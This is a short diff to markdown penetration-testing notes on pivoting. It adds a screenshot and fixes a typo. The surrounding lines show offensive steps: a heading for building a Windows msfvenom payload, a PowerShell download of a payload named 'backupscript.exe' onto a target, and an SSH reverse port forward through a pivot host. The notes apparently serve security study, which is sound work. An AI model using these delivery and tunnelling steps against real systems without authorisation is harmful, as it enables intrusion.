@@ -1,4 +1,5 @@
 
+![Screenshot_3](https://github.com/kiro6/penetration-testing-notes/assets/57776872/139f0117-4f36-436d-b4e2-29a9a58f1cec)
 
 #### Creating a Windows Payload with msfvenom
 ```shell
@@ -37,7 +38,7 @@ python3 -m http.server 8123
 Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
 
-#### Using SSH -R , tell the pivot to lesting to any coming req to `8080` and forward it to our machine in `8000`
+#### Using SSH -R , tell the pivot to listen to any coming req to `8080` and forward it to our machine in `8000`
 ```shell
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 ```
